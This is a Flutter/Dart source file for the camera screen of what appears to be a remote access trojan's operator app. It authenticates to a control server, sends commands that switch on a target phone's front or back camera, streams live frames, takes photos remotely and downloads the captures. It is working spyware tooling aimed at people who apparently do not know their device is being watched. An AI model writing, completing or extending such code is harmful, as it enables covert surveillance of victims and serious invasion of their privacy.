import '../services/api_config.dart';
import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:web_socket_channel/io.dart';
import 'package:web_socket_channel/web_socket_channel.dart';
import 'package:url_launcher/url_launcher.dart';
import 'api_service.dart';
import 'constants.dart';

const _kBg   = Color(0xFF0D1117);
const _kCard = Color(0xFF161B22);
const _kBlue = Color(0xFF3B82F6);
const _kCyan = Color(0xFF06B6D4);
const _kRed  = Color(0xFFEF4444);
const _kSub  = Color(0xFF9CA3AF);

class CameraScreen extends StatefulWidget {
  final String deviceId;
  final String sessionKey;
  const CameraScreen({super.key, required this.deviceId, required this.sessionKey});

  @override
  State<CameraScreen> createState() => _CameraScreenState();
}

class _CameraScreenState extends State<CameraScreen> {
  late RatApiService _api;
  bool _isLive = false, _isLoading = false, _isCapturing = false;
  String _status = 'Ready';
  Uint8List? _frame;
  WebSocketChannel? _channel;
  StreamSubscription? _sub;
  int _frameCount = 0;
  String _selectedCamera = "1"; // 0 = Back, 1 = Front (Match common Android mapping)
  List<dynamic> _history = [];
  String? _previewPhotoUrl;

  @override
  void initState() {
    super.initState();
    _api = RatApiService(widget.sessionKey);
    _fetchHistory();
  }

  @override
  void dispose() {
    _closeWs();
    if (_isLive) _stopLive(localOnly: true);
    super.dispose();
  }

  void _closeWs() {
    _sub?.cancel();
    _channel?.sink.close();
    _channel = null;
  }

  Future<void> _fetchHistory() async {
    try {
      final h = await _api.getCameraHistory(widget.deviceId);
      setState(() {
        _history = h;
        if (_history.isNotEmpty && _previewPhotoUrl == null) {
          _previewPhotoUrl = '${RatConstants.baseUrl}${_history[0]['url']}?key=${widget.sessionKey}';
        }
      });
    } catch (e) { /* silent */ }
  }

  Future<void> _startLive() async {
    setState(() { _isLoading = true; _status = 'Starting Live Cam...'; });
    try {
      _channel = IOWebSocketChannel.connect(Uri.parse(RatConstants.wsUrl), headers: ApiConfig.getHeaders());
      _channel!.sink.add('ADMIN_HANDSHAKE:${widget.sessionKey}:${widget.deviceId}');
      
      _sub = _channel!.stream.listen((data) {
        if (data is String) {
          if (data == 'ADMIN_AUTH:SUCCESS') {
            setState(() => _status = 'Authenticated');
          } else if (data.startsWith('VLIVE_FRAME:')) {
            final bytes = base64Decode(data.substring(12));
            setState(() { _frame = bytes; _frameCount++; _status = 'Streaming Live'; });
          } else if (data.startsWith('VRESP:TAKE_PHOTO:UPLOADED:')) {
            final fn = data.substring(26);
            setState(() {
              _previewPhotoUrl = '${RatConstants.baseUrl}/api/rat/download/${widget.deviceId}/camera/$fn?key=${widget.sessionKey}';
              _status = 'Photo Captured! (WS)';
              _isCapturing = false;
            });
            _fetchHistory();
          } else if (data.startsWith('VRESP:LIVE_CAM:ERROR:')) {
            setState(() { _status = 'Error: ${data.substring(21)}'; _stopLive(localOnly: true); });
          }
        }
      }, onError: (e) {
        setState(() => _status = 'WS Error: $e');
      }, onDone: () {
        if (_isLive) {
          setState(() => _status = 'Disconnected');
          _stopLive(localOnly: true);
        }
      });

      await _api.sendCommand(widget.deviceId, 'LIVE_CAM_START', args: _selectedCamera);
      setState(() { _isLive = true; _isLoading = false; _frameCount = 0; });
    } catch (e) {
      setState(() { _status = 'Error: $e'; _isLoading = false; });
    }
  }

  Future<void> _stopLive({bool localOnly = false}) async {
    setState(() { _isLoading = true; _status = 'Stopping...'; });
    _closeWs();
    if (!localOnly) await _api.sendCommand(widget.deviceId, 'LIVE_CAM_STOP');
    setState(() { _isLive = false; _isLoading = false; _status = 'Live stopped'; _frame = null; });
  }

  Future<void> _takePhoto() async {
    setState(() { _isCapturing = true; _status = 'Capturing photo...'; });
    try {
      await _api.sendCommand(widget.deviceId, 'S_PHOTO', args: _selectedCamera);
      _status = 'Waiting for upload...';
      
      // Poll for completion
      for (int i = 0; i < 30; i++) {
        await Future.delayed(const Duration(seconds: 1));
        if (!_isCapturing) return; // Handled by WS maybe
        
        final resp = await _api.getLastResponse(widget.deviceId);
        
        // resp is a Map with { "type": "...", "content": "..." }
        if (resp != null) {
          final type = resp['type'].toString();
          final content = resp['content'].toString();
          
          if (type == 'TAKE_PHOTO') {
            if (content.startsWith('UPLOADED:')) {
              final fn = content.substring(9);
              setState(() {
                _previewPhotoUrl = '${RatConstants.baseUrl}/api/rat/download/${widget.deviceId}/camera/$fn?key=${widget.sessionKey}';
                _status = 'Photo Captured! (Polling)';
                _isCapturing = false;
              });
              _fetchHistory();
              return;
            } else if (content.startsWith('ERROR:')) {
              setState(() { _status = 'Error: ${content.substring(6)}'; _isCapturing = false; });
              return;
            }
          }
        }
      }
      setState(() { _status = 'Capture Timeout'; _isCapturing = false; });
    } catch (e) {
      setState(() { _status = 'Error: $e'; _isCapturing = false; });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _kBg,
      body: SafeArea(
        child: Column(children: [
          _buildHeader(),
          _buildLivePreview(),
          _buildControls(),
          _buildHistory(),
        ]),
      ),
    );
  }

  Widget _buildHeader() {
    return Container(
      padding: const EdgeInsets.fromLTRB(16, 12, 16, 12),
      decoration: BoxDecoration(color: _kCard, border: Border(bottom: BorderSide(color: Colors.white.withOpacity(0.05)))),
      child: Row(children: [
        GestureDetector(
          onTap: () => Navigator.pop(context),
          child: Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(10), border: Border.all(color: Colors.white10)), child: const Icon(Icons.arrow_back_ios_rounded, color: Colors.white, size: 16)),
        ),
        const SizedBox(width: 12),
        Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(gradient: const LinearGradient(colors: [_kRed, Color(0xFF8B1E1E)]), borderRadius: BorderRadius.circular(10)), child: const Icon(Icons.videocam_rounded, color: Colors.white, size: 18)),
        const SizedBox(width: 12),
        const Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Text('Camera Control', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 16)),
          Text('Live stream & capture', style: TextStyle(color: _kSub, fontSize: 11)),
        ])),
        if (_isLive) Container(padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4), decoration: BoxDecoration(color: _kRed.withOpacity(0.15), borderRadius: BorderRadius.circular(20), border: Border.all(color: _kRed.withOpacity(0.3))), child: Row(children: [Container(width: 6, height: 6, decoration: const BoxDecoration(color: _kRed, shape: BoxShape.circle)), const SizedBox(width: 6), const Text('LIVE', style: TextStyle(color: _kRed, fontSize: 10, fontWeight: FontWeight.bold))])),
      ]),
    );
  }

  Widget _buildLivePreview() {
    return Expanded(
      flex: 3,
      child: Container(
        margin: const EdgeInsets.all(16),
        decoration: BoxDecoration(color: Colors.black, borderRadius: BorderRadius.circular(20), border: Border.all(color: _isLive ? _kRed.withOpacity(0.3) : Colors.white10, width: 2), boxShadow: [if(_isLive) BoxShadow(color: _kRed.withOpacity(0.1), blurRadius: 20)]),
        clipBehavior: Clip.antiAlias,
        child: Stack(fit: StackFit.expand, children: [
          if (_frame != null && _isLive)
            Image.memory(_frame!, gaplessPlayback: true, fit: BoxFit.contain)
          else if (_isLoading)
            const Center(child: CircularProgressIndicator(color: _kRed, strokeWidth: 2))
          else
            Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
              Icon(Icons.videocam_off_rounded, size: 48, color: Colors.white.withOpacity(0.1)),
              const SizedBox(height: 12),
              Text(_status, style: const TextStyle(color: _kSub, fontSize: 13)),
            ])),
          
          Positioned(top: 12, right: 12, child: Container(padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6), decoration: BoxDecoration(color: Colors.black54, borderRadius: BorderRadius.circular(10), border: Border.all(color: Colors.white10)), child: Text('$_frameCount Frames', style: const TextStyle(color: Colors.white70, fontSize: 10)))),
          
          if (_isLive) Positioned(bottom: 12, left: 0, right: 0, child: Center(child: Container(padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8), decoration: BoxDecoration(color: Colors.black54, borderRadius: BorderRadius.circular(20)), child: const Text('Live Stream Active', style: TextStyle(color: Colors.white, fontSize: 11))))),
        ]),
      ),
    );
  }

  Widget _buildControls() {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 16),
      child: Column(children: [
        Row(children: [
          _controlBtn(
            flex: 2,
            icon: _isLive ? Icons.stop_rounded : Icons.play_arrow_rounded,
            label: _isLive ? 'Stop Live' : 'Start Live',
            color: _isLive ? _kRed : _kBlue,
            onTap: _isLoading ? null : (_isLive ? _stopLive : _startLive),
          ),
          const SizedBox(width: 12),
          _controlBtn(
            flex: 2,
            icon: Icons.camera_alt_rounded,
            label: 'Take Photo',
            color: _kCyan,
            onTap: _isCapturing || _isLoading ? null : _takePhoto,
            isLoading: _isCapturing,
          ),
          const SizedBox(width: 12),
          _controlBtn(
            flex: 1,
            icon: Icons.cameraswitch_rounded,
            label: _selectedCamera == "1" ? 'Front' : 'Back',
            color: _kSub,
            onTap: _isLive || _isLoading ? null : () => setState(() => _selectedCamera = _selectedCamera == "1" ? "0" : "1"),
          ),
        ]),
        const SizedBox(height: 12),
      ]),
    );
  }

  Widget _controlBtn({required int flex, required IconData icon, required String label, required Color color, VoidCallback? onTap, bool isLoading = false}) {
    return Expanded(
      flex: flex,
      child: GestureDetector(
        onTap: onTap,
        child: Container(
          padding: const EdgeInsets.symmetric(vertical: 14),
          decoration: BoxDecoration(color: color.withOpacity(onTap == null ? 0.1 : 0.15), borderRadius: BorderRadius.circular(14), border: Border.all(color: color.withOpacity(onTap == null ? 0.1 : 0.4))),
          child: Column(children: [
            isLoading 
              ? const SizedBox(width: 20, height: 20, child: CircularProgressIndicator(strokeWidth: 2, color: Colors.white70))
              : Icon(icon, color: onTap == null ? color.withOpacity(0.3) : color, size: 20),
            const SizedBox(height: 6),
            Text(label, style: TextStyle(color: onTap == null ? color.withOpacity(0.3) : Colors.white, fontSize: 11, fontWeight: FontWeight.bold)),
          ]),
        ),
      ),
    );
  }

  Widget _buildHistory() {
    return Expanded(
      flex: 2,
      child: Container(
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(color: _kCard, borderRadius: const BorderRadius.vertical(top: Radius.circular(30))),
        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
            const Text('Capture History', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 15)),
            GestureDetector(onTap: _fetchHistory, child: const Icon(Icons.refresh_rounded, color: _kSub, size: 20)),
          ]),
          const SizedBox(height: 12),
          if (_history.isEmpty)
            Expanded(child: Center(child: Text('No captures yet', style: TextStyle(color: Colors.white.withOpacity(0.1)))) )
          else
            Expanded(
              child: GridView.builder(
                gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(crossAxisCount: 3, crossAxisSpacing: 10, mainAxisSpacing: 10),
                itemCount: _history.length,
                itemBuilder: (ctx, i) {
                  final item = _history[i];
                  final url = '${RatConstants.baseUrl}${item['url']}?key=${widget.sessionKey}';
                  return GestureDetector(
                    onTap: () => setState(() => _previewPhotoUrl = url),
                    onLongPress: () => launchUrl(Uri.parse(url)),
                    child: Container(
                      decoration: BoxDecoration(borderRadius: BorderRadius.circular(12), border: Border.all(color: _previewPhotoUrl == url ? _kRed : Colors.transparent, width: 2)),
                      clipBehavior: Clip.antiAlias,
                      child: Image.network(url, fit: BoxFit.cover, errorBuilder: (_,__,___) => const Icon(Icons.broken_image, color: Colors.white10)),
                    ),
                  );
                },
              ),
            ),
        ]),
      ),
    );
  }
}
